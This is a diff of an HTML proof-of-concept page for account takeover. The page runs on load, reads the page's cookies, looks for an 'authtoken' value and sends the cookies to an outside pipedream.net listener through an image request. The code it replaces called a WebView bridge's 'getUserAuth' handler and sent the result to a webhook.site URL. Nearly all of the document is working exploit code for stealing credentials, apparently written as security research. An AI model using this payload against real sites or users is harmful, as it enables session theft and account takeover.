@@ -2,19 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>E Payload</title>
-    <style> body { font-family: sans-serif; background-color: #lightyellow; padding: 10px; } </style>
+    <title>ATO Final POC</title>
+    <style> body { font-family: sans-serif; background-color: #ffdddd; padding: 10px; } </style>
 </head>
 <body>
-    <h1>E Payload Loaded!</h1>
+    <h1>ATO Payload Active!</h1>
     <p>Origin: <script>document.write(window.location.origin);</script></p>
-    <p>Attempting to access DSBridge and call getUserAuth...</p>
-    <p id="status">Status: Initializing...</p>
+    <p>Attempting to read and exfiltrate cookies...</p>
+    <p id="status">Status: Reading cookies...</p>
+    <pre id="cookieDisplay" style="background:#fff; padding:5px; border:1px solid #ccc; white-space: pre-wrap; word-wrap: break-word;"></pre>
 
 <script>
-    const LISTENER_URL_BASE = "https://webhook.site/2990b876-2e70-4500-acf2-88b0bd8c8d89";
+    const LISTENER_URL_BASE = "https://eo44gjggs7bwq2a.m.pipedream.net/";
+    // --------------------
 
     const statusP = document.getElementById('status');
+    const cookieDisplayPre = document.getElementById('cookieDisplay');
 
     function updateStatus(message) {
         console.log(message);
@@ -24,7 +27,8 @@
     function logToServer(data) {
         try {
             let encodedData = encodeURIComponent(JSON.stringify(data));
-            let requestUrl = LISTENER_URL_BASE + "?domain=asdex.me&data=" + encodedData;
+            // Include marker to know it came from this specific POC
+            let requestUrl = LISTENER_URL_BASE + "?type=COOKIE_LEAK_VIA_JS&domain=asdex.me&data=" + encodedData;
             console.log("Sending GET request to listener:", requestUrl);
             var img = new Image();
             img.src = requestUrl;
@@ -35,33 +39,20 @@
         }
     }
 
-    setTimeout(function() {
-        updateStatus("Attempting DSBridge call after delay...");
-        console.log("Attempting DSBridge call after delay...");
+    // --- Main Execution ---
+    window.onload = function() {
+        updateStatus("Page loaded. Reading document.cookie...");
+        const cookies = document.cookie;
+        cookieDisplayPre.textContent = cookies || "[No Cookies Accessible via document.cookie]";
 
-        if (window.dsBridge) {
-             updateStatus("dsBridge object FOUND! Using callHandler...");
-             console.log("dsBridge object found. Using callHandler...");
-             try {
-                 
-                 window.dsBridge.callHandler('getUserAuth', {}, function(authData) {
-                     updateStatus("SUCCESS: getUserAuth callback received!");
-                     console.log("Callback received from callHandler('getUserAuth'):", authData);
-                     logToServer({ type: 'gUA_SUCCESS_asdex.me', content: authData });
-                     
-                 });
-             } catch (e) {
-                 updateStatus("ERROR calling dsBridge.callHandler('getUserAuth'): " + e);
-                 console.error("Error using dsBridge.callHandler('getUserAuth'):", e);
-                 logToServer({ type: 'gUA_ERR_call_asdex.me', content: e.toString() });
-             }
+        if (cookies && cookies.includes('authtoken=')) {
+             updateStatus("SUCCESS: Found 'authtoken' in document.cookie! Exfiltrating...");
+             logToServer({authtoken_cookie_value: cookies});
         } else {
-             updateStatus("dsBridge object NOT found.");
-             console.error("dsBridge object not found.");
-             logToServer({ type: 'gUA_ERR_nobridge_asdex.me' });
-     
+            updateStatus("FAILURE: 'authtoken' not found in document.cookie.");
+            logToServer({ error: "authtoken not found in document.cookie" });
         }
-    }, 2500); 
+    };
 
 </script>
 
